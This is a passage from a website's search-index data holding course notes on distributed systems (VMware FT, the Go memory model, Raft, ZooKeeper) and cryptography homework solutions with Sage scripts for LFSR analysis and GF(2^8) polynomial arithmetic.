message below:\n Instruction number, interrupt type, interrupt data; Example:  When executing the 120120(instruction number) instruction since boot; Program get network packet (interrupt type); Carrying a tcp hand shake ACK (interrupt data);    Timer Interrupt #   How does FT handle timer interrupts?\n Goal: Make sure primary and backup should see interrupt at totally same situation;\nPrimary should do:\n FT fields the timer interrupt; FT reads instruction number X from CPU; FT send instruction number X on the logging channel to Backup; FT delivers interrupt to Primary and resume executing;  Backup should do:\n Ignores its own timer hardware; Backup see instruction number X from logging channel before the exact instruction executed; FT tells CPU to \u0026ldquo;interrupt me at instruction X\u0026rdquo;; FT mimics a timer interrupt to Backup;  Network Interrupt #   How does FT handle arrival of network packet?\n Goal: Exactly same as timer interrupt, with data designating.\nPrimary should do:\n Boosting: Tells NIC (Network Interface Controller) to copy packet data into FT\u0026rsquo;s private \u0026ldquo;bounce buffer\u0026rdquo;; At some point, NIC does DMA then interrupt:  FT pause the primary; FT copies the \u0026ldquo;bound buffer\u0026rdquo; into Primary\u0026rsquo;s memory; FT simulates a NIC interrupt in Primary; FT send \u0026ldquo;packet data\u0026rdquo; and \u0026ldquo;instruction number\u0026rdquo; to Backup through log channel;    Backup should do:\n Backup received instruction number from log stream; FT tells CPU to interrupt at instruction X; FT copies the data to backup memory and similates NIC interrupt in Backup;  Bounce Buffer #  What bounce buffer?\n Bounce buffer is a FT\u0026rsquo;s memory area that store network packet data;  Why bounce buffer?\n We want the data to appear in memory at exactly the same point in execution of the Primary and Backup;  More Rule #  Output Rule #  Suppose we encountered the following situation:\n Primary crashes jsut after sending the reply to client; Backup doesn\u0026rsquo;t receive any event from Primary because it has crashed;  Output rule was brought up to deal with this:\n Primary should repsonse to client after receiving ACKnowledgement from Backup;  Split Brain #  Suppose we encounter the following situation:\n Network between Primary and Backup has been cut over； So both machine think the other one is dead, and think it\u0026rsquo;s the Primary and stop sending logging event;  This is a common problem called \u0026ldquo;split brain\u0026rdquo;. FT creat a center server support atomic test-and-set instruction, machine who get flag can become Primary.\nSummary #  When might FT be attractive?\n  Critical but low-intensity services: name server;\n  Services whose software is not convenient to modify;\n  What about replication for high-throughput services?\n Recommend: Applicative-level replicated state machines;  Example: Database state machine, database only support a limit set of command which is easier to transfer message;   Result: less fine-grained synchronization (更细粒度的同步), less overhead;  "},{"id":107,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.go-raft/","title":"5. Go Raft","section":"分布式系统","content":" Go Memory Model: https://golang.org/ref/mem\n Go Threads and Raft #  Happens Before #  Hanpens Before，为了深入研究同步问题而提出的概念：\n 关于一个变量 v 的读语句 r 与写语句 w，r 可以得到 w 的值需要满足以下条件：  r does not happene before w; There is not other w' that happens before r and after w;   一个读语句 v 能够准确地捕获到某个特定的 w 语句的值，需要满足以下条件：  w happends before r; Any other w' to v either hanppends before w or after r;    Golang Lifetime #  Initialization, 一个 golang 程序的初始化：\n 对于库 p 引用库 q 的情况，p 的初始化函数开始在 q 的初始化函数结束之前； 在函数 main.main 执行前，所有函数的 init 函数都应该执行完成了；  Goroutine destruction：\n  Goroutine 的销毁不会被保证发生在任何事件之前（not guaranteed to happen before any event）。怎么理解这个 happened before 呢？比如下面这个例子：\n  var a string func hello() { go func() { a = \u0026#34;hello\u0026#34; }() print(a) } 其中，a 的赋值语句发生在一个单独的 goroutine 中，它之后没有任何同步语句，所以它有可能不会被任何事件使用，激进一点的编译器会直接拒绝编译。\n  Communication #  Golang 中线程同步的方法。\nChannel #  Example:\nvar c = make(chan int) var a string func f() { a = \u0026#34;hello, world\u0026#34; \u0026lt;-c } func main() { go f() c \u0026lt;- 0 print(a) } 这段代码一定会输出 hello world，因为根据上面的理论：\n a = \u0026quot;hello world\u0026quot; happends before \u0026lt;- c happends before f() happends before print(a);  Locks #  Example:\nvar l sync.Mutex var a string func f() { a = \u0026#34;hello, world\u0026#34; l.Unlock() } func main() { l.Lock() go f() l.Lock() print(a) } 上面这段代码一定会输出 hello world，因为根据理论：\n a = \u0026quot;hello world\u0026quot; happends before 第一个 l.Unlock() happens before 第二个 l.Lock() happens before print(a);  Once #  Example:\nvar a string var once sync.Once func setup() { a = \u0026#34;hello, world\u0026#34; } func doprint() { once.Do(setup) print(a) } func twoprint() { go doprint() go doprint() } 上面这个代码中保证了 setup 这个函数只能被调用一次，并且 print 一定会输出 hello world 函数，这是因为 once.Do 保证了每次调用都会在第一调用结束之后。\n"},{"id":108,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.raft/","title":"6. Raft","section":"分布式系统","content":" 论文地址：https://raft.github.io/raft.pdf\n Raft #  Split Brain #  之前学习过的系统中：\n MapReduce：replicates computation but relies on a single master to organize; GFS：replicates data but relies on the master to pick primaries; VMwareFT：replicates service but relies on test-and-set to pick primary;  上面这些系统在做核心决策的时候都需要依赖单一的机器，也就是通过单一的机器避免 Split Brain 问题。\n为什么会出现 Split Brain 问题呢？\n 根本原因在于计算机之间无法区分 server crashed 与 network broken 这两个情况。 比如：一个系统中的一个机器 A 无法与另一个机器 B 通信了，如果 A 认为 B 是宕机了而实际上是网络错误，反之亦然。A/B 就分裂成了两个独立的服务，它们都认为对方宕机而自己继续服务客户端请求；  \u0026ldquo;Split Brain\u0026rdquo; caused by \u0026ldquo;network partition\u0026rdquo; seemed insurmountable for a long time:\n  Previous Solution:\n A outside agent (a human) to decide when to cut over; A single perfectly reliable server (as in previous chapter); A perfectly reliable network, so no response will be congruent to crashed;    But all we face are single points of failure (not desirable);\n  Raft copes with partition by \u0026ldquo;Majority Vote\u0026rdquo;。多数投票机制并不是一个可以配置的 50%，不是随便想出来的一个数字，它里面包含了许多微妙的思想：\n At most one partition can have a majority (eg: 2f+1 can tolerate f failed servers) Any two terms must intersect (抽屉原理); Any command log in history must exist in one term (同样是抽屉原理);  Before Raft, two partition-tolerant replication schemes were invented around 1990:\n Paxos and View-Stamped Replication  Overview #  Time Diagram of Raft System handles client-command:\n  Client:\n Clients only interact with the leader as long as the Leader stays up; Clients can\u0026rsquo;t see follower states or logs; Reason: distributed system should mimicing a single server;    Leader:\n Client sends command to Leader; Leader add command to log; Leader sends AppendEntries RPCs to Followers; Leader waits for replies from a bare majority (including itself) entry is committed; Leader executes the command, replies to client; Commit info will send back to Followers in next AppendEntries RPCs;    Followers:\n Follower adds command to log once it receive the AppendEntries; Follower execute the command only if it know the Leader has executes the command;    Why the logs?\n The log orders the commands, to ensure replicas agree on a single execution order; In case: Leader must re-send to Followers; In case mache crash: persistent commands can be replay after reboot;  Some replicas may lag in logs, but whey\u0026rsquo;ll eventually coverage to be identical;\nLeader Election #  Leader ensures all replicas execute the same commands in the same order.\nDifferent leader mark by term number, any term number will only have one leader at most.\nWhen election start?\n Follower doesn\u0026rsquo;t hear from current Leader for an \u0026ldquo;election timeout\u0026rdquo;, increments local currentTerm, try to collect votes;  What happens if an elections doesn\u0026rsquo;t succeed?\n Wait for another \u0026ldquo;election timeout\u0026rdquo;, a new election with higher term takes precedence.  Split votes problem:\n 问题：  如果所有 Candidates 同时到达 \u0026ldquo;election timeout\u0026rdquo;，那么它们都将把票投给自己，那么这个系统将永远无法选举出新的 Leader;   解决方案：  Each server picks a random election timeout, one will choose lowest random delay (randomized delays are a common pattern in network protocols); Least timeout: A few heartbeat intervals to avoid needless elections, short enough to react quickly to failure (avoid long pauses); Least interval: Long enough to let one candidate succeed before next starts; Max timeout: The max tolerant time system stop;    Raft Log #  Storage format:\n 每个服务器维护自己的操作日志，日志的的内容是操作本身； 每个日志都被放在一个递增的 log slot 中，同时还保存了这个日志发生的 term（也就标记了这个日志是由哪个 Leader 处理的）；  新上任的 Leader 发现日志不一致，怎么做？\n Raft forces agreement by having Followers adopt new Leader\u0026rsquo;s log; 具体策略：  Leader 每次发送 AppendEntries 包会带上日志的 prevLogIndex 与 prevLogTerm； 当 Follower 发现 prevLog 值不匹配时会响应 false； Leader 收到响应失败时会将 prev 倒退一次再次发送，一致循环直到响应 true； 当 Follower 匹配到 prevLog 值时会删除这个 log 后的所有日志后重新接受 Leader 的日志；   以上策略只是一个简化版本，显然我们可以通过更少的交互 rollback quicker；  如何确保 Follower 的冗余日志是可以删除的，这等价于 Leader 的日志是完整的：\n 通过选举策略确保 Leader 的日志是完整的，只有在以下情况下，服务器的 RequestVote 才会给 Candidate：  Candidate has higher term in last log entry; Candidate has same last term and (same length or longer log);   这个策略确保了被竞选上的 Leader 有着比一半以上服务器更新或相等的日志；  Persistence #  What would we like to happen after a server crashes?\n Raft system should continue handle client request with one missing server. Failed server must be repaired soon to avoid dipping below a majority.  The strategy that Raft uses is to reboot crashed server.\nRaft server persistent value for restarting:\n log[]: If a server was in leader\u0026rsquo;s majority for committing an entry, it must remember entry despite reboot, so any future leader is guaranteed to see the committed log entry. 也就是说我们从每个服务器的所有持久化日志中，能够准确的还原出“分布式系统”完成的对外响应日志； voteFor: To prevent a server vote for multiple candidates in one term; currentTerm: To ensure terms only increase;  How does the service recover its state after a crash+reboot?\n Easy approach: start with empty state and re-play all logs; Faster optimize: use Raft snapshot and replay just the tail of log;  Log Compaction \u0026amp;\u0026amp; Snapshots #  Discard log:\n  Problem: Log will get to be huge, which will take a long time to re-play on reboot or send to a new server;\n  Solution: Service periodically creates persistent \u0026ldquo;snapshot\u0026rdquo;, and discard previous log.\nNotice: Can\u0026rsquo;t discard entries that un-executed or un-committed.\n  What if follower\u0026rsquo;s log ends before leader\u0026rsquo;s log starts?\n Leader reparirs that follower with InstallSnapshot RPC instead of AppendEntries RPC  Linearizability #  Linearizability (or \u0026ldquo;strong\u0026rdquo; consistentcy) is the most common and instuitive definition formalizes behavior expected of a single server.\nDefinition: An execution history is linearizable if:\n One can find a total order of all operations, that matches real-time; And in which each read sees the value from the write preceding it in the order;   Example see: http://nil.csail.mit.edu/6.824/2020/notes/l-raft2.txt\n Duplicate RPC Detection #  "},{"id":109,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/7.zookeeper/","title":"7. Zoo Keeper","section":"分布式系统","content":" Paper: https://www.usenix.org/legacy/event/atc10/tech/full_papers/Hunt.pdf\n ZooKeeper #  What questions does this paper shed light on?\n  我们是否能将 Raft 中提到的服务间合作封装成一个通用的服务？\n如果可以，API 应该设计成什么样？其他的分布式系统应该怎么使用这个服务？\n  我们在一个分布式系统总投入了 N 倍的机器，能够得到 N 倍的性能提升？\n  Performance #  Raft：在添加了更多的 replicas 之后，因为 Leader 需要等待响应的机器增多，反而会降低性能。ZooKeeper 提高性能的一个基本思想是：\n 将 \u0010Read 负载分散到各个 Replicas 机器中，使得读性能能够随机器数量线性地提升； 但是在传统的 Raft 架构下的\u0010\u0010\u0010，直接读取 Replicas 会遇到一些问题：  Replica may not be in majority, so may not have seen a completed write; Replica may not yet have seen a commit for a completed write; Replica may be entirely cut off from the leader;    How does ZooKeeper skin this cat?\n By changing the definition of correctness: It allows reads to yield stale data, but otherwise preserves order.  How does ZooKeeper guarantees ordering?\n Linearizable writes:  Clients only send writes to the leader; The leader chooses an order (numbered by zxid) responses to client; Leader must preserve client write order (zxid) across leader failure, Replicas must enforce \u0026ldquo;client\u0026rsquo;s reads never go backwards in zxid order\u0026rdquo;;   FIFO client order:  Client\u0026rsquo;s successive reads execute at non-decreasing points in the order. Each read request will carry previous zxid write order; Server may block a client\u0026rsquo;s read to wait for previous write, or sync; (If the most recent zxid that replica sees happens before the zxid client assign)    简单地说，ZooKeeper 通过以下方式显著提高了读性能：\n 丢失“读”的一致性，但是保证了单客户端“读写”一致性（也就是说如果是我之前“写”的内容，我一定可以“读”到）； 这一一致性的损失其实是可以接受的，因为在大部分的系统中，我一般只关心自己的内容；  Other performance tricks:\n Client can send async writes to leader; Leader batches up many requests to reduce net and disk-write overhead; Fuzzy snapshots (and idempotent updates) so snapshot doesn\u0026rsquo;t stop writes;  性能分析：\n 高“读”吞吐：“读”性能随机器数量增加而增加； 低“写”吞吐：“写”性能随机器数量增加而降低（21000 次写/秒）；  General-purpose Coordination Service #  API #  ZooKeeper API Overview：\n States: A file-system-like tree of znodes consist of: file names/file content/directories/path names/version number; Types of znodes: Regular, ephemeral, sequential;  Operations on znodes:\ncreate(path, data, flags) # Only first create indicates success delete(path, version) # delete znode if znode(path).version = version exists(path, watch) # set watch=true, client will receive notification if path is later created/deleted getData(path, watch) # same as above setData(path, data, version) # only set data if znode(path).version = version getChildren(path, watch) # get all children node, example: /x/y/z is a child node of /x/y/ sync() # sync then read, ensures writes before sync are visible to same client's read Example #  Example1: Increment a number stored in ZooKeeper znode:\n  需要考虑的情况：read return stale data; another client concurrently writes value。pseudocode：\nwhile true: x, v := getData(\u0026quot;f\u0026quot;) if setData(x + 1, version=v): break   Example2: Simple Locks:\n  Pseudocode:\nacquire(): while true: if create(\u0026quot;lf\u0026quot;, ephemeral=true): return success if exists(\u0026quot;lf\u0026quot;, watch=true): wait for notification release(): (voluntarily or session timeout) delete(\u0026quot;lf\u0026quot;)   Example3: Locks without Herd Effect:\n  上面简单锁的问题：当存在大量客户端竞争同一个锁资源时，会导致锁竞争问题：每次锁的释放都有大量客户端发起竞争请求，但是实际却只有一个客户端得到了锁资源；\n  Acquire Pseudocode:\ncreate a \u0026quot;sequential\u0026quot; file while true: list files if no lower-numbered: return lock is acquired! if exists(next-lower-numbered, watch=true): wait for event...   这类使用 ephemeral 或 sequential 的锁被称为 Soft Lock，因为在客户端长时间未响应时，ZooKeeper 会主动删除文件，它适用于可重复贡献问题（计算两次是可以被接受的）。\n如果要使用原子锁，应该使用 ready 文件执行最小事务（删除后再添加表示执行结束）。\nMore #  ZooKeeper is a successful design.\nTopics not covered:\n Persistence; Details of batching and pipelining for performance; Fuzzy snapshots; Idempotent operations; Duplicate client request detection;  "},{"id":110,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework1/","title":"Homework1","section":"密码学","content":"Chapter2 #  第六题 #  话不多说直接上脚本：\n#!/usr/bin/env python2 # coding=utf-8 from sage.all import * class Crack: cipher = \u0026#34;1010110110\u0026#34; plain = \u0026#34;0100010001\u0026#34; order = 3 def __init__(self): mapper = lambda (a,b):GF(2)(int(a)^int(b)) self.stream = map(mapper, [(self.cipher[i], self.plain[i]) for i in range(10)]) def crack_by_matrix(self): \u0026#34;\u0026#34;\u0026#34; 时间复杂度 O(n^3) :return: 返回一个状态转移矩阵 \u0026#34;\u0026#34;\u0026#34; S0 = Matrix([self.stream[i :i+5] for i in range(5)]) S1 = Matrix([self.stream[i+1:i+6] for i in range(5)]) rank1, rank2 = S0.rank(), S1.rank() assert (rank1 == rank2) and (self.order == rank1) S0 = Matrix([self.stream[i :i+3] for i in range(3)]) S1 = Matrix([self.stream[i+1:i+4] for i in range(3)]) return S0.solve_right(S1) def crack_by_bm(self): \u0026#34;\u0026#34;\u0026#34; 时间复杂度 O(n^2) :return: 返回一个 lfsr 的特征多项式 \u0026#34;\u0026#34;\u0026#34; # todo: 这里直接调用了 sagemath 的系统 api # 这个 API 好像有一些问题，后来被放弃了，但是这个题目是正常的 from sage.matrix.berlekamp_massey import berlekamp_massey return berlekamp_massey(self.stream) if __name__ == \u0026#34;__main__\u0026#34;: c = Crack() print \u0026#34;转移矩阵：\\n\u0026#34;, c.crack_by_matrix() print \u0026#34;\\n特征多项式：\\n\u0026#34;, c.crack_by_bm() 用 sage 版本的 python2 运行这个脚本，可以得到：\n$ python2 crack-6.py 转移矩阵： [0 0 1] [1 0 0] [0 1 1] 特征多项式： x^3 + x^2 + 1 第八题 #  我觉得这个题目的 bk 序列是有问题的：\nsage: berlekamp_massey([GF(2)(int(c)) for c in \u0026#34;001011011011000001011011011000\u0026#34;]) x^15 + 1 这也就是说能够构造 bk 的最小多项式是 $$x^{15} + 1$$，这很显然不是一个四级序列：\n  虽然 bk 的周期等同于一个 4 级 m-sequence 的周期，\n  它并不是 m-sequence，它的特征多项式也非常奇怪。\n  这意味着我们只能用穷举法求他的周期，使用公式 $$(2^n - 1)(2^m - 1)$$ 是错误的。\n  话不多说上代码（第六题中的技巧已经被封装：shesl-crypto）：\n#!/usr/bin/env python2 from sage.all import * from sheslcrypto.LFSR import MatrixCrackLfsr class Crack: ak = [GF(2)(c) for c in \u0026#34;11101001110100\u0026#34;] bk = [GF(2)(c) for c in \u0026#34;001011011011000001011011011000\u0026#34;] def __init__(self): crackak = MatrixCrackLfsr(self.ak) self.Ma = crackak.crack_by_matrix() crackbk = MatrixCrackLfsr(self.bk) self.Mb = crackbk.crack_by_matrix() self.ck = [] def calculate_nexta(self): vector_a = vector(self.ak[-self.Ma.rank():]) next_a = vector_a * self.Ma self.ak.append( GF(2)(next_a[-1]) ) def calculate_nextb(self): vector_b = vector(self.bk[-self.Mb.rank():]) next_b = vector_b * self.Mb self.bk.append( GF(2)(next_b[-1]) ) def JK_calculate_nextc(self): index = len(self.ck) if index == len(self.ak): self.calculate_nexta() if index == len(self.bk): self.calculate_nextb() a,b = self.ak[index], self.bk[index] self.ck.append( a if (index == 0) else ( GF(2)((a + b + 1) * self.ck[index - 1] + a) ) ) def reach_period(self): l = len(self.ck) return self.ck[:l/2] == self.ck[l/2:] def crack_JK_c(self): for _ in range( max(self.Ma.rank(), self.Mb.rank()) ): self.JK_calculate_nextc() while True: self.JK_calculate_nextc() if self.reach_period(): break return self.ck, len(self.ck)/2 if __name__ == \u0026#34;__main__\u0026#34;: c = Crack() print c.crack_JK_c() 结果如下：\n$ python crack-8.py ([1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1], 105) 周期是 105，虽然和公式结果一样，但是我们并不能使用公式。\n例 2-8 #   定理 2-7: GF(2) 上的 n 长 m-sequence {ai} 应该满足下面的三个条件：\n 在一个周期内，0、1 出现的次数分别是 $$2^{n-1} - 1$$ 和 $$2^{n - 1}$$； 在一个周期内，总游程数为 $$2^{n-1}$$；对长为 $$i (1 \\le i \\le n-1)$$ 的游程有 $$2^{n-1-i}$$ 个，0、1 各半； $${a_i}$$ 的自相关函数为 $$\\displaystyle R(\\tau) = \\begin{cases} 1, \u0026amp; \\tau = 0 \\\\displaystyle -\\frac{1}{2^n - 1}, \u0026amp; 0 \u0026lt; \\tau \\le 2^n - 2 \\end{cases}$$   对于例 2-8，其等价于 $$f_1 = 1 + x +x^3, f_2 = 1 + x^2 + x^3$$ 这样两个多项式，构成一个钟控序列生成器，现在我们通过上面的定理 2-7 证明它是不是一个 m 序列。他们的转移矩阵是很显然的。\n话不多说，直接上代码：\n#!/usr/bin/env python2 from sage.all import * class ClockSequence: Ta = Matrix(GF(2),[ [0, 0, 1], [1, 0, 1], [0, 1, 0]]) Tb = Matrix(GF(2),[ [0, 0, 1], [1, 0, 0], [0, 1, 1]]) def __init__(self): self.a = vector(GF(2), [1, 1, 1]) self.b = vector(GF(2), [1, 1, 1]) def __iter__(self): return self def next(self): c = self.b[0] if self.a[0] == 1: self.b = self.b * self.Tb self.a = self.a * self.Ta return c if __name__ == \u0026#34;__main__\u0026#34;: cs = ClockSequence() cs_iter = iter(cs) lst = [next(cs_iter) for _ in range(49)] print(lst.count(1), lst.count(0)) 运行它就可以发现：\n(sage-sh) $ python test-2-8.py (28, 21) 他们的 0、1 数量差了很多。\n"},{"id":111,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework2/","title":"Homework2","section":"密码学","content":"第二次作业 #  第一题 #   在 $$GF(2^8)$$ 中，取模多项式 $$m(x) = x^8 + x^4 + x^3 + x + 1$$，计算下面的积：\n 0xB7 * 0x3F 0x11 * 0xFF   我们把两题一起做，首先转化为多项式：\n $$183 = x^7 + x^5 + x^4 + x^2 + x + 1$$ $$63 = x^5 + x^4 + x^3 + x^2 + x + 1$$ $$17 = x^4 + 1$$ $$255 = x^7 + x^6 + x^5 + x^4 + x^3 + x^2 + x + 1$$  然后我们在 $$\\Z_2$$ 的多项式环上，做多项式乘法：\n  $$183*64 = x^{12} + x^{11} + x^9 + x^8 + x^5 + x^3 + x^2 + 1$$\n  $$17 * 255 = x^{11} + x^{10} + x^9 + x^8 + x^3 + x^2 + x + 1$$\n  然后我们在 m(x) 上取模：\n $$183 * 64 \\equiv x^6 + x^5 + x^4 + x + 1 \\pmod{m(x)}$$ $$17 * 255 \\equiv x^7 + x^4 + x^2 + x \\pmod{m(x)}$$  然后就可以将这两个多项式转化成整数的表示：\n $$x^6 + x^5 + x^4 + x + 1 = 115$$ $$x^7 + x^4 + x^2 + x = 150$$  第二题 #   设 $$a(x) = 0x1Bx^3 + 0x03x^2 + 0xDD*x + 0xA1$$，与 $$b(x) = 0xAC * x^3 + 0xF0 * x + 0x2D$$，为系数在 $$GF(2^8)$$ 上的两个多项式，计算 $$a(x) \\otimes b(x) \\pmod{x^4 + 1}$$\n 给出两个假设\n 设系数定义在整数模环上的多项式为 Z， 定义在有限域 $$GF(2^8)$$ 的多项式为 P，设 $$GF(2^8)$$ 上的元素用 c 表示。由于题目中未指定模多项式，我们认为它是使用的 Rijndael 的多项式：$$x^8 + x^4 + x^3 + x + 1$$  我们认为题设中的两个多项式是定义在 Z 上，我们先把它们转化为 P 上：\n $$a(x) = \\begin{bmatrix} 1b \u0026amp;* x^{3}\\3 \u0026amp;* x^{2}\\dd \u0026amp;* x^{1}\\a1 \u0026amp;* x^{0} \\end{bmatrix} = \\begin{bmatrix} (c^4 + c^3 + c + 1) \u0026amp;* x^{3}\\(c + 1) \u0026amp;* x^{2}\\(c^7 + c^6 + c^4 + c^3 + c^2 + 1) \u0026amp;* x^{1}\\(c^7 + c^5 + 1) \u0026amp;* x^{0} \\end{bmatrix}$$ $$b(x) = \\begin{bmatrix} ac \u0026amp;* x^{3}\\0 \u0026amp;* x^{2}\\f0 \u0026amp;* x^{1}\\2d \u0026amp;* x^{0} \\end{bmatrix} = \\begin{bmatrix} (c^7 + c^5 + c^3 + c^2) \u0026amp;* x^{3}\\(0) \u0026amp;* x^{2}\\(c^7 + c^6 + c^5 + c^4) \u0026amp;* x^{1}\\(c^5 + c^3 + c^2 + 1) \u0026amp;* x^{0} \\end{bmatrix}$$  我们注意到 a(x) 与 b(x) 的乘法有限域，定义在模 $$x^4 + 1$$ 上，这意味着 $$x^j \\equiv x^{j \\pmod{4}}\\pmod{x^4 + 1}$$。\n如果我们设 $$c(x) = c_3* x^3 + c_2 * x^2 + c_1 x^1 + c_0\\equiv a(x) \\otimes b(x) \\pmod{x^4 + 1}$$，则对于 c(x)，我们知道：\n $$\\begin{bmatrix} c_{0}\\c_{1}\\c_{2}\\c_{3} \\end{bmatrix} = \\begin{bmatrix} a_{0} \u0026amp; a_{3} \u0026amp; a_{2} \u0026amp; a_{1}\\a_{1} \u0026amp; a_{0} \u0026amp; a_{3} \u0026amp; a_{2}\\a_{2} \u0026amp; a_{1} \u0026amp; a_{0} \u0026amp; a_{3}\\a_{3} \u0026amp; a_{2} \u0026amp; a_{1} \u0026amp; a_{0} \\end{bmatrix} * \\begin{bmatrix} b_{0}\\b_{1}\\b_{2}\\b_{3} \\end{bmatrix}$$  于是我们经过一些计算可以得到 c(x)：\n $$c(x) = \\begin{bmatrix} (c^6 + c^5 + c^4 + c) \u0026amp;* x^{3}\\(c^4 + c) \u0026amp;* x^{2}\\(c^6 + c^4 + c^3 + c) \u0026amp;* x^{1}\\(c^4 + c^3) \u0026amp;* x^{0} \\end{bmatrix} = \\begin{bmatrix} 72 \u0026amp;* x^{3}\\12 \u0026amp;* x^{2}\\5a \u0026amp;* x^{1}\\18 \u0026amp;* x^{0} \\end{bmatrix}$$  "},{"id":112,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/script2/","title":"Script2","section":"密码学","content":"第二次作业 #  第一题 #   在 $$GF(2^8)$$ 中，取模多项式 $$m(x) = x^8 + x^4 + x^3 + x + 1$$，计算下面的积：\n 0xB7 * 0x3F 0x11 * 0xFF   #!/usr/bin/env python2 from sage.all import * class Solve: def __init__(self): x = var(\u0026#39;x\u0026#39;) self.FF = GF(2 ** 8, name=\u0026#39;x\u0026#39;, modulus=x**8 + x**4 + x**3 + x + 1) self.l1, self.r1 = self.FF.fetch_int(0xb7), self.FF.fetch_int(0x3f) self.l2, self.r2 = self.FF.fetch_int(0x11), self.FF.fetch_int(0xff) def solve1(self): res = self.l1 * self.r1 print \u0026#34;\\t%d= %s\u0026#34; % (self.l1.integer_representation(), self.l1) print \u0026#34;*\\t%d= %s\u0026#34; % (self.r1.integer_representation(), self.r1) print \u0026#34;=\\t%d= %s\u0026#34; % (res.integer_representation(), res) print \u0026#34;mod\\t%s\\n\u0026#34; % self.FF.modulus() def solve2(self): res = self.l2 * self.r2 print \u0026#34;\\t%d= %s\u0026#34; % (self.l2.integer_representation(), self.l2) print \u0026#34;*\\t%d= %s\u0026#34; % (self.r2.integer_representation(), self.r2) print \u0026#34;=\\t%d= %s\u0026#34; % (res.integer_representation(), res) print \u0026#34;mod\\t%s\\n\u0026#34; % self.FF.modulus() if __name__ == \u0026#34;__main__\u0026#34;: s = Solve() s.solve1() s.solve2() 运行结果：\n$ python solve-1.py 183 = x^7 + x^5 + x^4 + x^2 + x + 1 *\t63 = x^5 + x^4 + x^3 + x^2 + x + 1 =\t115 = x^6 + x^5 + x^4 + x + 1 mod\tx^8 + x^4 + x^3 + x + 1 17 = x^4 + 1 *\t255 = x^7 + x^6 + x^5 + x^4 + x^3 + x^2 + x + 1 =\t150 = x^7 + x^4 + x^2 + x mod\tx^8 + x^4 + x^3 + x + 1 第二题 #   设 $$a(x) = 0x1Bx^3 + 0x03x^2 + 0xDD*x + 0xA1$$，与 $$b(x) = 0xAC * x^3 + 0xF0 * x + 0x2D$$，为系数在 $$GF(2^8)$$ 上的两个多项式，计算 $$a(x) \\otimes b(x) \\pmod{x^4 + 1}$$\n #!/usr/bin/env python2 from sage.all import * class Solve: def __init__(self): c = PolynomialRing(GF(2), names=\u0026#39;c\u0026#39;).gen() self.xPR = PolynomialRing(ZZ, names=\u0026#39;x\u0026#39;) self.cFF = GF(2**8, names=\u0026#34;c\u0026#34;, modulus=c**8 + c**4 + c**3 + c + 1) self.yPR = PolynomialRing(self.cFF, names=\u0026#39;y\u0026#39;) x, y = self.xPR.gen(), self.yPR.gen() self.f1_x, self.f2_x = 0x1B * x**3 + 0x03 * x**2 + 0xDD*x + 0xA1, 0xAC * x**3 + 0xF0 * x + 0x2D self.f1_y, self.f2_y = self.x2y(self.f1_x), self.x2y(self.f2_x) self.base_poly = self.x2y(x**4 + 1) def x2y(self, x_poly): return self.yPR([self.cFF.fetch_int(c) for c in x_poly.list()]) def y2x(self, y_poly): return self.xPR([c.integer_representation() for c in y_poly.list()]) def display_x(self, x): Fstring = \u0026#34;\\\\begin{bmatrix}%s\\end{bmatrix}\u0026#34; fstring = \u0026#34;%x\u0026amp;* x^{%d}\u0026#34; return Fstring % \u0026#39;\\\\\\\\\u0026#39;.join([ fstring % (coff, ind) for ind,coff in enumerate(x.list()) ][::-1]) def display_y(self, y): Fstring = \u0026#34;\\\\begin{bmatrix}%s\\end{bmatrix}\u0026#34; fstring = \u0026#34;(%s) \u0026amp;* x^{%d}\u0026#34; return Fstring % \u0026#39;\\\\\\\\\u0026#39;.join([ fstring % (coff, ind) for ind, coff in enumerate(y.list()) ][::-1]) def solve(self): res_y = self.f1_y * self.f2_y % self.base_poly res_x = self.y2x(res_y) print \u0026#34;\\t%s\\n\\t%s\\n\u0026#34; %( self.display_x(self.f1_x), self.display_y(self.f1_y) ) print \u0026#34;\\odot\\t%s\\n\\t%s\\n\u0026#34; % ( self.display_x(self.f2_x), self.display_y(self.f2_y) ) print \u0026#34;=\\t%s\\n\\t%s\\n\u0026#34; % ( self.display_x(res_x), self.display_y(res_y) ) print \u0026#34;mod\\t%s\u0026#34; % self.y2x(self.base_poly) if __name__ == \u0026#34;__main__\u0026#34;: s = Solve() s.solve() 运行结果：\n$ python solve-2.py \\begin{bmatrix} 1b \u0026amp;* x^{3}\\\\3 \u0026amp;* x^{2}\\\\dd \u0026amp;* x^{1}\\\\a1 \u0026amp;* x^{0} \\end{bmatrix} \\begin{bmatrix} (c^4 + c^3 + c + 1) 